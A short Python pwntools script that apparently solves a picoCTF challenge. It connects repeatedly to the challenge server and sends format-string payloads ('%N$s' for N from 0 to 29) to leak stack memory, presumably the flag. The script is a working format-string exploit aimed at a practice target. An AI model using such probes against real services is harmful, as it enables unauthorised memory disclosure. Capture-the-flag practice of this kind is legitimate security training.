#! /bin/python3

from pwn import *

host,port = 'saturn.picoctf.net', 54892

for i in range(30):
    s = remote(host,port)
    s.recvuntil(b'>>')
    s.sendline('%' + str(i) + '$s')
    print(s.recvuntil(b'-'))
    print(i, s.recv())
    s.close()